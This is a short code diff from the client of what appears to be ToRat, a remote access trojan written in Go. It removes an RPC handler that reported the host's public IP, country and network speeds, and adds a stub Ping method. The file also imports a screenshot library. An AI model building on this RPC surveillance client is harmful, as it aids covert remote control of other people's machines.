@@ -7,7 +7,6 @@ import (
 	"io/ioutil"
 	"log"
 	"net"
-	"net/http"
 	"net/rpc"
 	"os"
 	"path/filepath"
@@ -18,7 +17,6 @@ import (
 	"github.com/lu4p/ToRat/shared"
 	"github.com/lu4p/ToRat/torat_client/crypto"
 	"github.com/lu4p/cat"
-	"github.com/showwin/speedtest-go/speedtest"
 	"github.com/vova616/screenshot"
 )
 
@@ -78,29 +76,9 @@ func (a *API) LS(v shared.Void, r *shared.Dir) (err error) {
 	return
 }
 
-func (a *API) Speedtest(v shared.Void, r *shared.Speedtest) error {
-
-	url := "https://api.ipify.org?format=text"
-	resp, _ := http.Get(url)
-	ip, _ := ioutil.ReadAll(resp.Body)
-	resp.Body.Close()
-	r.IP = string(ip)
-
-	user, _ := speedtest.FetchUserInfo()
-	serverList, _ := speedtest.FetchServerList(user)
-	targets, _ := serverList.FindServer([]int{})
-
-	for _, s := range targets {
-		s.PingTest()
-		s.DownloadTest(false)
-		s.UploadTest(false)
-
-		r.Download = s.DLSpeed
-		r.Upload = s.ULSpeed
-		r.Ping = s.Latency.String()
-		r.Country = s.Country
-	}
-
+func (a *API) Ping(v shared.Void, r *string) error {
+	// TODO implement
+	*r = "Pong"
 	return nil
 }
 
